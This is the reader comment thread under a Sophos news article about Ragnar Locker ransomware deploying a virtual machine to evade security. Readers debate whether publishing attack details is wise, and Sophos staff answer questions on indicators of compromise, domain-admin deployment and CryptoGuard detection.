					<p>Guys, they all will start do that! Why you post this info so any idiot can copy-paste it and use???</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187339#respond' data-commentid="187339" data-postid="66749" data-belowelement="comment-187339" data-respondelement="respond" data-replyto="Reply to Helen Bou" aria-label='Reply to Helen Bou'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment odd alt depth-2  " id="comment-187348" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Ed Handschuh											</h2>
					<time class="comment-meta-item" datetime="2020-05-21T21:01-04:00" itemprop="datePublished"><a href="#comment-187348" itemprop="url">21 May 2020 at 9:01 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Because:  </p>
<p>1)  Knowledge is power and allows others to defend against it.<br />
2)  This attack is a new attack vector that has not been seen before.  While they may &#8220;copy and paste&#8221;, it&#8217;s not going be as effective as people have been advised to this type off attack and have already shored up their defenses against it.<br />
3)  Not much here that is super secret or particularly special.  Just rather normal scripting that can be found on most hacker sites and/or admin sites.  No real sense hiding it.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187348#respond' data-commentid="187348" data-postid="66749" data-belowelement="comment-187348" data-respondelement="respond" data-replyto="Reply to Ed Handschuh" aria-label='Reply to Ed Handschuh'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even depth-2  " id="comment-187351" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Lars Sundström											</h2>
					<time class="comment-meta-item" datetime="2020-05-21T21:15-04:00" itemprop="datePublished"><a href="#comment-187351" itemprop="url">21 May 2020 at 9:15 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Because Sophos AV can&#8217;t be stopped like that.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187351#respond' data-commentid="187351" data-postid="66749" data-belowelement="comment-187351" data-respondelement="respond" data-replyto="Reply to Lars Sundström" aria-label='Reply to Lars Sundström'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt depth-2  " id="comment-187392" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo avatar-default' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													James Gornall											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T06:46-04:00" itemprop="datePublished"><a href="#comment-187392" itemprop="url">22 May 2020 at 6:46 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>The best way to ensure attacks fail is to publicise the results of analysis, primarily (in my view) by showing how complex attacks can, when pulled apart, seem absurdly simple to execute (there&#8217;s no advanced code involved here just a knowledge of how systems interoperate) . GPOs are extremely powerful but many firms give their junior techs domain admin access, if publication of this makes companies reconsider that it&#8217;s already done the security world a favour.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187392#respond' data-commentid="187392" data-postid="66749" data-belowelement="comment-187392" data-respondelement="respond" data-replyto="Reply to James Gornall" aria-label='Reply to James Gornall'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even depth-2  " id="comment-187426" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													James											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T14:29-04:00" itemprop="datePublished"><a href="#comment-187426" itemprop="url">22 May 2020 at 2:29 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>:face_palm: really? Because security by obscurity has worked so well in the past. ugh&#8230;</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187426#respond' data-commentid="187426" data-postid="66749" data-belowelement="comment-187426" data-respondelement="respond" data-replyto="Reply to James" aria-label='Reply to James'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt depth-2  " id="comment-187431" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://dnet.com" itemprop="author">Andreas Kasidis</a>
											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T15:17-04:00" itemprop="datePublished"><a href="#comment-187431" itemprop="url">22 May 2020 at 3:17 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Go do some homework before posting in serious IT Sec web pages&#8230;..</p>
<p>They only documented the automation part.. Do you see the actual ransomware executable (they don&#8217;t even released the hash) or the custom vdi image somewhere in the article in order for someone to replicate the attack?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187431#respond' data-commentid="187431" data-postid="66749" data-belowelement="comment-187431" data-respondelement="respond" data-replyto="Reply to Andreas Kasidis" aria-label='Reply to Andreas Kasidis'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even thread-odd thread-alt depth-1  " id="comment-187341" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Tyeth Gundry											</h2>
					<time class="comment-meta-item" datetime="2020-05-21T19:17-04:00" itemprop="datePublished"><a href="#comment-187341" itemprop="url">21 May 2020 at 7:17 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Thanks, interesting as always</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187341#respond' data-commentid="187341" data-postid="66749" data-belowelement="comment-187341" data-respondelement="respond" data-replyto="Reply to Tyeth Gundry" aria-label='Reply to Tyeth Gundry'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-even depth-1  " id="comment-187346" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo avatar-default' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Anonymous											</h2>
					<time class="comment-meta-item" datetime="2020-05-21T20:49-04:00" itemprop="datePublished"><a href="#comment-187346" itemprop="url">21 May 2020 at 8:49 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Good thing that Sophos Application Control can block Virtualisation software and Live Discover can find such devices in a number of ways, e.g. https://community.sophos.com/products/intercept/early-access-program/f/live-discover-queries/120072/live-discover-query&#8212;virtual-devices</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187346#respond' data-commentid="187346" data-postid="66749" data-belowelement="comment-187346" data-respondelement="respond" data-replyto="Reply to " aria-label='Reply to '>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even thread-odd thread-alt depth-1 parent " id="comment-187374" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Mikeanalyst											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T04:01-04:00" itemprop="datePublished"><a href="#comment-187374" itemprop="url">22 May 2020 at 4:01 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>any IoC or hashes? We need hashes of the malware</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187374#respond' data-commentid="187374" data-postid="66749" data-belowelement="comment-187374" data-respondelement="respond" data-replyto="Reply to Mikeanalyst" aria-label='Reply to Mikeanalyst'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-gallagherseanm odd alt depth-2  bystaff" id="comment-187469" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													gallagherseanm											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T19:10-04:00" itemprop="datePublished"><a href="#comment-187469" itemprop="url">22 May 2020 at 7:10 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Since the files were custom-compiled for the victim, the hashes and filenames may vary. In any case, we hope to publish the hashes from this attack at a later date.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187469#respond' data-commentid="187469" data-postid="66749" data-belowelement="comment-187469" data-respondelement="respond" data-replyto="Reply to gallagherseanm" aria-label='Reply to gallagherseanm'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even thread-even depth-1  " id="comment-187412" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Dimitri											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T11:15-04:00" itemprop="datePublished"><a href="#comment-187412" itemprop="url">22 May 2020 at 11:15 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Thanks for posting &#8220;How to&#8221;. Worked fine!</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187412#respond' data-commentid="187412" data-postid="66749" data-belowelement="comment-187412" data-respondelement="respond" data-replyto="Reply to Dimitri" aria-label='Reply to Dimitri'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-odd thread-alt depth-1  " id="comment-187419" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Mike											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T12:23-04:00" itemprop="datePublished"><a href="#comment-187419" itemprop="url">22 May 2020 at 12:23 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>They gave the guy that ran Silk Road 2 life sentences plus 40 years letting people buy and sell on his website. How about death for these jerks?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187419#respond' data-commentid="187419" data-postid="66749" data-belowelement="comment-187419" data-respondelement="respond" data-replyto="Reply to Mike" aria-label='Reply to Mike'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even thread-even depth-1  " id="comment-187444" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo avatar-default' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Denish											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T17:54-04:00" itemprop="datePublished"><a href="#comment-187444" itemprop="url">22 May 2020 at 5:54 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Great piece of work &#8211; sharing knowledge will allow others to build defences/controls.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187444#respond' data-commentid="187444" data-postid="66749" data-belowelement="comment-187444" data-respondelement="respond" data-replyto="Reply to Denish" aria-label='Reply to Denish'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-odd thread-alt depth-1  " id="comment-187445" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://www.none.com" itemprop="author">Denish</a>
											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T17:55-04:00" itemprop="datePublished"><a href="#comment-187445" itemprop="url">22 May 2020 at 5:55 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Great breakdown &#8211; sharing enables us to utliise controls/defences to mitigate.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187445#respond' data-commentid="187445" data-postid="66749" data-belowelement="comment-187445" data-respondelement="respond" data-replyto="Reply to Denish" aria-label='Reply to Denish'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even thread-even depth-1 parent " id="comment-187470" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://www.twitter.com/techjournalist" itemprop="author">Sean Kerner</a>
											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T19:11-04:00" itemprop="datePublished"><a href="#comment-187470" itemprop="url">22 May 2020 at 7:11 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Dumb question &#8211; but how does the unsigned code get on the system? Was there user action required?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187470#respond' data-commentid="187470" data-postid="66749" data-belowelement="comment-187470" data-respondelement="respond" data-replyto="Reply to Sean Kerner" aria-label='Reply to Sean Kerner'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-gallagherseanm odd alt depth-2  bystaff" id="comment-187952" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													gallagherseanm											</h2>
					<time class="comment-meta-item" datetime="2020-05-26T16:08-04:00" itemprop="datePublished"><a href="#comment-187952" itemprop="url">26 May 2020 at 4:08 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>The attacker had domain admin access, and was able to force deploy.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187952#respond' data-commentid="187952" data-postid="66749" data-belowelement="comment-187952" data-respondelement="respond" data-replyto="Reply to gallagherseanm" aria-label='Reply to gallagherseanm'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even thread-odd thread-alt depth-1  " id="comment-187476" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													BillBingham2											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T19:53-04:00" itemprop="datePublished"><a href="#comment-187476" itemprop="url">22 May 2020 at 7:53 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>First, THANK YOU!!!  Excellent work and great leveling of info allowing folks like me (area of interest but not focus of profession.). </p>
<p>Second, does  VBox have the ability to limit access to host file system that if you install in with that option before the Bad Install starts would/could protect the targeted system?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187476#respond' data-commentid="187476" data-postid="66749" data-belowelement="comment-187476" data-respondelement="respond" data-replyto="Reply to BillBingham2" aria-label='Reply to BillBingham2'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-even depth-1  " id="comment-187493" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													pcworm											</h2>
					<time class="comment-meta-item" datetime="2020-05-22T22:16-04:00" itemprop="datePublished"><a href="#comment-187493" itemprop="url">22 May 2020 at 10:16 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Great work!</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187493#respond' data-commentid="187493" data-postid="66749" data-belowelement="comment-187493" data-respondelement="respond" data-replyto="Reply to pcworm" aria-label='Reply to pcworm'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even thread-odd thread-alt depth-1  " id="comment-187536" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													yggtr											</h2>
					<time class="comment-meta-item" datetime="2020-05-23T06:14-04:00" itemprop="datePublished"><a href="#comment-187536" itemprop="url">23 May 2020 at 6:14 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Virtual Machines should require license to use, like firearms.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187536#respond' data-commentid="187536" data-postid="66749" data-belowelement="comment-187536" data-respondelement="respond" data-replyto="Reply to yggtr" aria-label='Reply to yggtr'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-even depth-1 parent " id="comment-187537" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													lemon											</h2>
					<time class="comment-meta-item" datetime="2020-05-23T06:16-04:00" itemprop="datePublished"><a href="#comment-187537" itemprop="url">23 May 2020 at 6:16 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Other IOCs such as domain names for hosting the MSI would also be nice.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187537#respond' data-commentid="187537" data-postid="66749" data-belowelement="comment-187537" data-respondelement="respond" data-replyto="Reply to lemon" aria-label='Reply to lemon'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-gallagherseanm even depth-2  bystaff" id="comment-187951" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													gallagherseanm											</h2>
					<time class="comment-meta-item" datetime="2020-05-26T16:08-04:00" itemprop="datePublished"><a href="#comment-187951" itemprop="url">26 May 2020 at 4:08 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>There was a single IP address (no domain) hosting the attack. We&#8217;ll post other IOCs when we can.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187951#respond' data-commentid="187951" data-postid="66749" data-belowelement="comment-187951" data-respondelement="respond" data-replyto="Reply to gallagherseanm" aria-label='Reply to gallagherseanm'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment odd alt thread-odd thread-alt depth-1 parent " id="comment-187544" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													William Jansen											</h2>
					<time class="comment-meta-item" datetime="2020-05-23T07:01-04:00" itemprop="datePublished"><a href="#comment-187544" itemprop="url">23 May 2020 at 7:01 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>So how can / does Sophos prevent/detect/respond ?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187544#respond' data-commentid="187544" data-postid="66749" data-belowelement="comment-187544" data-respondelement="respond" data-replyto="Reply to William Jansen" aria-label='Reply to William Jansen'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-gallagherseanm even depth-2 parent bystaff" id="comment-187950" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													gallagherseanm											</h2>
					<time class="comment-meta-item" datetime="2020-05-26T16:07-04:00" itemprop="datePublished"><a href="#comment-187950" itemprop="url">26 May 2020 at 4:07 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>CryptoGuard stopped this attack by tracking behavior.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187950#respond' data-commentid="187950" data-postid="66749" data-belowelement="comment-187950" data-respondelement="respond" data-replyto="Reply to gallagherseanm" aria-label='Reply to gallagherseanm'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment odd alt depth-3 parent " id="comment-188591" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Abhishek Joshi											</h2>
					<time class="comment-meta-item" datetime="2020-05-30T13:13-04:00" itemprop="datePublished"><a href="#comment-188591" itemprop="url">30 May 2020 at 1:13 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Can you provide a brief description on how this attack was detected? According to the article, the antivirus cannot detect the ransomware because it is running inside a virtual machine. Did CryptoGuard detect GPO events or MSI events or did it identify the virtual machine as a point of attack and stopped it?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=188591#respond' data-commentid="188591" data-postid="66749" data-belowelement="comment-188591" data-respondelement="respond" data-replyto="Reply to Abhishek Joshi" aria-label='Reply to Abhishek Joshi'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-gallagherseanm even depth-4  bystaff" id="comment-190597" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													gallagherseanm											</h2>
					<time class="comment-meta-item" datetime="2020-06-15T14:38-04:00" itemprop="datePublished"><a href="#comment-190597" itemprop="url">15 June 2020 at 2:38 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>CryptoGuard detected the activity coming from VirtualBox, and stopped it.</p>
